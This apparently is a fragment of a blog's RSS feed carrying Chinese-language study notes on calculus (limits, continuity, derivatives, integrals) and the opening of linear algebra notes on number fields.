&lt;p&gt;形如： &lt;strong&gt;f(g(u(x)))&lt;/strong&gt; 或 &lt;strong&gt;f&lt;/strong&gt; o &lt;strong&gt;g&lt;/strong&gt; o &lt;strong&gt;u&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;反函数&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;反函数的单调性基本归纳于 &lt;strong&gt;先外后内，同增异减&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;初等函数&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;初等函数是由&lt;strong&gt;幂函数（power function）、指数函数（exponential function）、对数函数（logarithmic function）、三角函数（trigonometric function）、反三角函数（inverse trigonometric function&lt;/strong&gt; 与常数经过有限次的有理运算（加、减、乘、除、有理数次乘方、有理数次开方）及有限次函数复合所产生，并且能用一个解析式表示的函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;第二节-数列的极限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二节-数列的极限&#34;&gt;#&lt;/a&gt; 第二节 数列的极限&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;邻域&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;邻域&lt;/li&gt;
&lt;li&gt;去心邻域&lt;/li&gt;
&lt;li&gt;左 (右) 邻域&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;数列基本概念&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;有限 or 无限&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通项公式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;整标函数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;子数列&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;单调性&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;作差或作商求单调性。有时候利用数列的单调性可能会得到惊喜的解题方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTUlQjAlRTUlODglOTclRTYlOUUlODElRTklOTklOTA/ZnJvbU1vZHVsZT1sZW1tYV9zZWFyY2gtYm94&#34;&gt;数列极限&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;收敛数列与数列的有界性&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;tip：数列收敛一定有界，数列有界不一定收敛&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;极限唯一性 &amp;amp; 有界性 &amp;amp; 保号性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;极限四则运算法则（严格意义上要分别证明数列的与函数的）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;第三节-函数的极限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第三节-函数的极限&#34;&gt;#&lt;/a&gt; 第三节 函数的极限&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODclQkQlRTYlOTUlQjAlRTYlOUUlODElRTklOTklOTAvNzI3MDgz&#34;&gt;函数极限&lt;/span&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/00_1.png&#34; alt=&#34;00_1&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;函数某点极限存在的充要条件是左右极限都存在且相等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQjUlQjclRTYlQjYlODUlRTUlQUUlOUElRTclOTAlODY/ZnJvbU1vZHVsZT1sZW1tYV9zZWFyY2gtYm94&#34;&gt;海涅 (Heine) 定理&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;求函数极限&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;简单的有限次函数，如果最高次项系数相等比较最高次项系数，如果不等，次数高的为高阶无穷大量。&lt;/li&gt;
&lt;li&gt;妙用，分子有理化，分母有理化。&lt;/li&gt;
&lt;li&gt;通分消去。&lt;/li&gt;
&lt;li&gt;立方差、因式分解。&lt;/li&gt;
&lt;li&gt;裂项等将无穷项收缩的方法。&lt;/li&gt;
&lt;li&gt;......&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;复合函数极限&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;第四节-函数的连续性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第四节-函数的连续性&#34;&gt;#&lt;/a&gt; 第四节 函数的连续性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;连续性概念&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;由极限的性质可知，一个函数在某点连续的充要条件是它在该点左右都连续。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;间断点分类&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/Mathematics/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%BA%8C/</guid>
            <title>数学笔记二</title>
            <link>https://evefortosaber.github.io/2023/03/19/Mathematics/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%BA%8C/</link>
            <category>Notes</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;数学笔记二&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数学笔记二&#34;&gt;#&lt;/a&gt; 数学笔记・二&lt;/h1&gt;
&lt;h3 id=&#34;第四节-函数的连续性承第一章函数与极限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第四节-函数的连续性承第一章函数与极限&#34;&gt;#&lt;/a&gt; 第四节 函数的连续性（承第一章函数与极限）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;连续性概念&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;由极限的性质可知，一个函数在某点连续的充要条件是它在该点左右都连续。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;间断点分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第一类间断点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEYlQUYlRTUlOEUlQkIlRTklOTclQjQlRTYlOTYlQUQlRTclODIlQjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=&#34;&gt;可去间断点&lt;/span&gt;&lt;/strong&gt;：函数在该点左极限、右极限存在且相等，但不等于该点函数值或函数在该点无定义。如函数 y=（x^2-1)/(x-1) 在点 x=1 处。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQjclQjMlRTglQjclODMlRTklOTclQjQlRTYlOTYlQUQlRTclODIlQjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=&#34;&gt;跳跃间断点&lt;/span&gt;&lt;/strong&gt;：函数在该点左极限、右极限存在，但不相等。如函数 y=|x|/x 在点 x=0 处。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第二类间断点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://baike.baidu.com/item/%E6%97%A0%E7%A9%B7%E9%97%B4%E6%96%AD%E7%82%B9/3531630?fromModule=lemma_inlink&#34;&gt;&lt;strong&gt;无穷间断点&lt;/strong&gt;&lt;/a&gt;：函数在该点可以无定义，且左极限、右极限至少有一个不存在，且函数在该点极限为∞。如函数 y=tanx 在点 x=π/2 处。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOEMlQUYlRTglOEQlQTElRTklOTclQjQlRTYlOTYlQUQlRTclODIlQjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=&#34;&gt;振荡间断点&lt;/span&gt;&lt;/strong&gt;：函数在该点可以无定义，当自变量趋于该点时，函数值在两个常数间变动无限多次。如函数 y=sin (1/x) 在 x=0 处。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;由上述对各种间断点的描述可知，&lt;strong&gt;函数 f (x) 在第一类间断点的左右极限都存在，而函数 f (x) 在第二类间断点的左右极限至少有一个不存在&lt;/strong&gt;，这也是第一类间断点和第二类间断点的本质上的区别。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第五节&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第五节&#34;&gt;#&lt;/a&gt; 第五节&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;迫敛准则&lt;/p&gt;
&lt;p&gt;主要是放缩，抓住可合成量（如 N 个 1 求和为 n*(n+1)/2），和高阶量不变原则&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;单调有界准则&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;单调有界数列必有极限。用于证明收敛很有用。&lt;/p&gt;
&lt;p&gt;求极限时可以&lt;strong&gt;先假设存在&lt;/strong&gt;。方便计算。&lt;s&gt;（避免求数列通项）&lt;/s&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;两个重要极限&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220921223539147.png&#34; alt=&#34;image-20220921223539147&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;第二个很重要，第一个可以直接看成等价无穷小。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第六节&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第六节&#34;&gt;#&lt;/a&gt; 第六节&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;无穷小量&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;确切地说，当自变量 x 无限接近 x&amp;lt;sub&amp;gt;0&amp;lt;/sub&amp;gt;（或 x 的绝对值无限增大）时，函数值 f (x) 与 0 无限接近，即 f (x)→0 (或 f (x)=0)，则称 f (x) 为当 x→x&amp;lt;sub&amp;gt;0&amp;lt;/sub&amp;gt;(或 x→∞) 时的无穷小量。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;等阶无穷小量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;即两个无穷小量坐商得常数时。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;等价无穷小量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;即两个无穷小量坐商得 1。等价无穷小量可互换。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;常见等价无穷小量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://pica.zhimg.com/v2-f20a929bed77e97c61a9f83de9b4b5a4_r.jpg?source=1940ef5c&#34; alt=&#34;aa&#34; title=&#34;等价无穷小&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;em&gt;关于我突然变水的原因&lt;/em&gt;：&lt;/p&gt;
&lt;p&gt;实在是比较忙，各项内容也越来越复杂，所以就择取主要的知识点并舍去证明。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;以上。&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;第二章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二章&#34;&gt;#&lt;/a&gt; 第二章&lt;/h2&gt;
&lt;h3 id=&#34;导数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#导数&#34;&gt;#&lt;/a&gt; 导数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;导数定义&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;函数可导一定连续，函数连续不一定可导。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;求导法则&lt;/p&gt;
&lt;p&gt;注意除法，反函数，隐函数求导法则。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;掌握反代的思想，掌握对数求导法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;含参求导&lt;/p&gt;
&lt;p&gt;一阶导可直接求二阶导可能需要反代。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;注意导数与微分的关系，如何二阶导隐函数。以及推导方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;断点处的导数求解，在有定义时使用求导法。&lt;/p&gt;
&lt;p&gt;在无定义时，使用定义法。(求极限)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;高阶函数求导注意规律，和复合函数的导&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;微分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#微分&#34;&gt;#&lt;/a&gt; 微分&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;一元函数，可导则可微&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;微分常数 A，与极限有关&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;微分运算类似求导法则&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;微分近似运算&lt;/p&gt;
&lt;p&gt;f(x)=f(x0)+f&#39;(x0)(x-x0)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为了计算 f (x)，可找一个邻近于 x 的 x0，只要 f (x) 和 f&#39;(x) 容易计算，就可以利用这个公式计算 f (x) 的近似值。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/%E5%BE%AE%E5%88%86%E8%BF%91%E4%BC%BC%E8%AE%A1%E7%AE%97.jpg&#34; alt=&#34;微分&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;第三章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第三章&#34;&gt;#&lt;/a&gt; 第三章&lt;/h2&gt;
&lt;h3 id=&#34;微分中值定理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#微分中值定理&#34;&gt;#&lt;/a&gt; 微分中值定理&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;费马引理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/%E8%B4%B9%E9%A9%AC%E5%BC%95%E7%90%86.jpg&#34; alt=&#34;费马引理&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;罗尔中值定理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/%E7%BD%97%E5%B0%94%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86.jpg&#34; alt=&#34;罗尔中值定理&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;拉格朗日中值定理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86.jpg&#34; alt=&#34;拉格朗日中值定理&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;柯西中值定理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/%E6%9F%AF%E8%A5%BF%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86.jpg&#34; alt=&#34;柯西中值定理&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;洛必达法则&lt;/p&gt;
&lt;p&gt;泰勒公式&lt;/p&gt;
&lt;p&gt;麦克劳林公式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;佩亚诺余项&lt;/p&gt;
&lt;p&gt;高阶无穷小&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;拉格朗日余项&lt;/p&gt;
&lt;p&gt;中值 -- 定量分析&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;函数的凹凸性&lt;/p&gt;
&lt;h2 id=&#34;第四章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第四章&#34;&gt;#&lt;/a&gt; 第四章&lt;/h2&gt;
&lt;h4 id=&#34;不定积分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不定积分&#34;&gt;#&lt;/a&gt; 不定积分&lt;/h4&gt;
&lt;h5 id=&#34;换元积分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#换元积分&#34;&gt;#&lt;/a&gt; 换元积分&lt;/h5&gt;
&lt;h5 id=&#34;分部积分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分部积分&#34;&gt;#&lt;/a&gt; 分部积分&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;凑微分，低次换元，三角换元，二次换元，重复型&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;积分表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#积分表&#34;&gt;#&lt;/a&gt; 积分表&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/%E7%A7%AF%E5%88%86%E8%A1%A8.jpg&#34; alt=&#34;积分表&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;有理函数的不定积分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#有理函数的不定积分&#34;&gt;#&lt;/a&gt; 有理函数的不定积分&lt;/h5&gt;
&lt;p&gt;待定系数法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;万能公式&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/%E4%B8%87%E8%83%BD%E5%85%AC%E5%BC%8F.jpg&#34; alt=&#34;万能公式&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;定积分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定积分&#34;&gt;#&lt;/a&gt; 定积分&lt;/h4&gt;
&lt;h5 id=&#34;定积分概念求无穷项和的极限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定积分概念求无穷项和的极限&#34;&gt;#&lt;/a&gt; 定积分概念求无穷项和的极限&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/%E5%AE%9A%E7%A7%AF%E5%88%86%E6%A6%82%E5%BF%B5.jpg&#34; alt=&#34;定积分概念&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;估值定理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#估值定理&#34;&gt;#&lt;/a&gt; 估值定理&lt;/h5&gt;
&lt;p&gt;区间内的 Max 与 Min 乘以区间长度得到限定区间。&lt;/p&gt;
&lt;h5 id=&#34;积分中值定理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#积分中值定理&#34;&gt;#&lt;/a&gt; 积分中值定理&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/%E7%A7%AF%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86.jpg&#34; alt=&#34;积分中值定理&#34; /&gt;&lt;/p&gt;
&lt;p&gt;求积分函数极限时用到，由介值定理推得&lt;/p&gt;
&lt;h5 id=&#34;几何意义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#几何意义&#34;&gt;#&lt;/a&gt; 几何意义&lt;/h5&gt;
&lt;h5 id=&#34;牛顿莱布尼茨公式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#牛顿莱布尼茨公式&#34;&gt;#&lt;/a&gt; 牛顿莱布尼茨公式&lt;/h5&gt;
&lt;h5 id=&#34;微积分学基本定理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#微积分学基本定理&#34;&gt;#&lt;/a&gt; 微积分学基本定理&lt;/h5&gt;
&lt;p&gt;连续函数必存在原函数&lt;/p&gt;
&lt;h5 id=&#34;平面曲线的弧长与曲率&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#平面曲线的弧长与曲率&#34;&gt;#&lt;/a&gt; 平面曲线的弧长与曲率&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/1%E5%BC%A7%E9%95%BF%E5%85%AC%E5%BC%8F.png&#34; alt=&#34;1弧长公式&#34; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/2%E5%BC%A7%E9%95%BF%E5%85%AC%E5%BC%8F.png&#34; alt=&#34;2&#34; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/3%E5%BC%A7%E9%95%BF%E5%85%AC%E5%BC%8F.png&#34; alt=&#34;3&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;极坐标系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#极坐标系&#34;&gt;#&lt;/a&gt; 极坐标系&lt;/h5&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;x=pcosa,y=psina;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h5 id=&#34;平面曲线的曲率&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#平面曲线的曲率&#34;&gt;#&lt;/a&gt; 平面曲线的曲率&lt;/h5&gt;
&lt;h5 id=&#34;曲率圆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#曲率圆&#34;&gt;#&lt;/a&gt; 曲率圆&lt;/h5&gt;
&lt;h5 id=&#34;定积分的几何应用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定积分的几何应用&#34;&gt;#&lt;/a&gt; 定积分的几何应用&lt;/h5&gt;
&lt;h5 id=&#34;连续函数的平均值&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#连续函数的平均值&#34;&gt;#&lt;/a&gt; 连续函数的平均值&lt;/h5&gt;
&lt;h5 id=&#34;定积分在物理学与经济学&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定积分在物理学与经济学&#34;&gt;#&lt;/a&gt; 定积分在物理学与经济学&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;变力做功&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;引力问题&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;液体侧面压力&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;反常积分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反常积分&#34;&gt;#&lt;/a&gt; 反常积分&lt;/h5&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/Mathematics/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0%E4%B8%80/</guid>
            <title>线性代数笔记一</title>
            <link>https://evefortosaber.github.io/2023/03/19/Mathematics/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0%E4%B8%80/</link>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;线性代数笔记一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#线性代数笔记一&#34;&gt;#&lt;/a&gt; 线性代数笔记一&lt;/h1&gt;
&lt;h2 id=&#34;第一章-线性方程组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一章-线性方程组&#34;&gt;#&lt;/a&gt; 第一章 线性方程组&lt;/h2&gt;
&lt;h3 id=&#34;数域及n元向量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数域及n元向量&#34;&gt;#&lt;/a&gt; 数域及 N 元向量&lt;/h3&gt;
&lt;h4 id=&#34;数域的一些相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数域的一些相关&#34;&gt;#&lt;/a&gt; 数域的一些相关&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;设 P 是由一些数组成的集合，&lt;strong&gt;&amp;lt;u&amp;gt; 其中包括 0 与 1&amp;lt;/u&amp;gt;&lt;/strong&gt;，如果 P 中任意两个数的&lt;em&gt;&lt;strong&gt;和、差、积、商&lt;/strong&gt;&lt;/em&gt;（除数不为 0）仍是 P 中的数，则称 P 为一个数域。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常见数域&lt;/strong&gt;： 复数域&lt;strong&gt; C&lt;/strong&gt;；实数域&lt;strong&gt; R&lt;/strong&gt;；有理数域&lt;strong&gt; Q&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;（注意：自然数集 N 及整数集 Z 都不是数域。）&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;说明：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;若数集 P 中任意两个数作某一运算的结果仍在 P 中，则说数集 P 对这个运算是封闭的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;数域的等价定义&lt;/strong&gt;：如果一个包含 0，1 在内的数集 P 对于加法，减法，乘法与除法（除数不为 0）是封闭的，则称数集 P 为一个数域。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;逆元、单位元&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;逆元&lt;/strong&gt;：在集合中定义某种运算 f (x)，元素与其逆元进行 f (x) 运算得到该运算单位元。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加法逆元：即相反数，元素与其加法逆元之和为加法单位元 0。&lt;/li&gt;
&lt;li&gt;乘法逆元：即倒数，元素与其乘法逆元之积为乘法单位元 1。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;单位元&lt;/strong&gt;：当它和其他元素结合时，并不会改变那些元素。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加法单位元 0，n+o=n;&lt;/li&gt;
&lt;li&gt;乘法单位元 1，n*1=n;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
